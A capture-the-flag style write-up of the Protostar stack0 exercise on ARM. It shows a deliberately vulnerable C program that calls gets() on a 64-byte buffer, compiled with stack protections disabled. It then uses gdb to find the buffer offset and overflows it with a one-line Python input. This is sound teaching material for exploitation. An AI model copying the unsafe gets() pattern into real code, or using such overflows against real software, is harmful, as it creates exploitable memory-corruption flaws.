## Protostar ARM ./stack0

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
    printf("you have changed the 'modified' variable\n");
  } else {
    printf("Try again?\n");
  }
}
```
---

#### _Let's start_


We compile the code with the following options and we execute the produced binary

```c
pi@raspberrypi:~/protostar/stack0 $gcc -g -fno-stack-protector -z execstack -no-pie -o stack0 stack0.c
pi@raspberrypi:~/protostar/stack0 $ ./stack0
aaaaaa
Try again?
```

The next step is to analyze the binary with gdb and set a breakpoint after that the `gets()` function is called `(0x0001045c)` or `(0x00010460)`

```c
pi@raspberrypi:~/protostar/stack0 $ gdb ./stack0

...

Reading symbols from ./stack0...done.
gef➤  disassemble main
Dump of assembler code for function main:
   0x00010434 <+0>:	push	{r11, lr}
   0x00010438 <+4>:	add	r11, sp, #4
   0x0001043c <+8>:	sub	sp, sp, #80	; 0x50
   0x00010440 <+12>:	str	r0, [r11, #-80]	; 0xffffffb0
   0x00010444 <+16>:	str	r1, [r11, #-84]	; 0xffffffac
   0x00010448 <+20>:	mov	r3, #0
   0x0001044c <+24>:	str	r3, [r11, #-8]
   0x00010450 <+28>:	sub	r3, r11, #72	; 0x48
   0x00010454 <+32>:	mov	r0, r3
   0x00010458 <+36>:	bl	0x10308 <gets@plt>
   0x0001045c <+40>:	ldr	r3, [r11, #-8]
   0x00010460 <+44>:	cmp	r3, #0
   0x00010464 <+48>:	beq	0x10474 <main+64>
   0x00010468 <+52>:	ldr	r0, [pc, #28]	; 0x1048c <main+88>
   0x0001046c <+56>:	bl	0x10314 <puts@plt>
   0x00010470 <+60>:	b	0x1047c <main+72>
   0x00010474 <+64>:	ldr	r0, [pc, #20]	; 0x10490 <main+92>
   0x00010478 <+68>:	bl	0x10314 <puts@plt>
   0x0001047c <+72>:	mov	r3, #0
   0x00010480 <+76>:	mov	r0, r3
   0x00010484 <+80>:	sub	sp, r11, #4
   0x00010488 <+84>:	pop	{r11, pc}
   0x0001048c <+88>:	andeq	r0, r1, r4, lsl #10
   0x00010490 <+92>:	andeq	r0, r1, r0, lsr r5
End of assembler dump.
gef➤  b *0x00010460
Breakpoint 3 at 0x10460: file stack0.c, line 13.
```

Let' run the program

```c
gef➤  r
Starting program: /home/pi/protostar/stack0/stack0
AAAAAAAA

Breakpoint 1, main (argc=0x1, argv=0x7efff594) at stack0.c:13
13	  if(modified != 0) {
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x7efff3fc  →  "AAAAAAAA"
$r1  : 0x0       
$r2  : 0x1       
$r3  : 0x0       
$r4  : 0x0       
$r5  : 0x00010494  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x00010344  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44  →  0x00000000
$r11 : 0x7efff444  →  0x76e82718  →  <__libc_start_main+268> bl 0x76e99780 <__GI_exit>
$r12 : 0xfbad2288
$sp  : 0x7efff3f0  →  0x7efff594  →  0x7efff6e1  →  "/home/pi/protostar/stack0/stack0"
$lr  : 0x41414141 ("AAAA"?)
$pc  : 0x00010460  →  <main+44> cmp r3,  #0
$cpsr: [negative ZERO CARRY overflow interrupt fast thumb]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff3f0│+0x0000: 0x7efff594  →  0x7efff6e1  →  "/home/pi/protostar/stack0/stack0"	 ← $sp
0x7efff3f4│+0x0004: 0x00000001
0x7efff3f8│+0x0008: 0x00000000
0x7efff3fc│+0x000c: "AAAAAAAA"	 ← $r0
0x7efff400│+0x0010: "AAAA"
0x7efff404│+0x0014: 0x76ffd000  →  0x464c457f
0x7efff408│+0x0018: 0x76ff9500  →  0x76e6b000  →  0x464c457f
0x7efff40c│+0x001c: 0x76e6ebc4  →  0x4ac6ae15
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
      0x10454 <main+32>        mov    r0,  r3
      0x10458 <main+36>        bl     0x10308 <gets@plt>
      0x1045c <main+40>        ldr    r3,  [r11,  #-8]
 →    0x10460 <main+44>        cmp    r3,  #0
      0x10464 <main+48>        beq    0x10474 <main+64>
      0x10468 <main+52>        ldr    r0,  [pc,  #28]	; 0x1048c <main+88>
      0x1046c <main+56>        bl     0x10314 <puts@plt>
      0x10470 <main+60>        b      0x1047c <main+72>
      0x10474 <main+64>        ldr    r0,  [pc,  #20]	; 0x10490 <main+92>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:stack0.c+13 ────
      8	   char buffer[64];
      9	 
     10	   modified = 0;
     11	   gets(buffer);
     12	 
           // modified=0x0
 →   13	   if(modified != 0) {
     14	       printf("you have changed the 'modified' variable\n");
     15	   } else {
     16	       printf("Try again?\n");
     17	   }
     18	 }
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack0", stopped 0x10460 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10460 → main(argc=0x1, argv=0x7efff594)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  print &modified
$1 = (volatile int *) 0x7efff44c
gef➤  print &buffer
$2 = (char (*)[64]) 0x7efff40c
gef➤  print 0x7efff44c-0x7efff40c
$3 = 0x40
gef➤  

```
We reached the breakpoint and as we can see, we can modify the variable `modified` writing after the space allocated for the variable `buffer (64 bytes = 0x40h)`.

Let's try...

```c
pi@raspberrypi:~/protostar/stack0 $ python -c "print 'A' * 65" | ./stack0
you have changed the 'modified' variable
```
**_Done :)_**
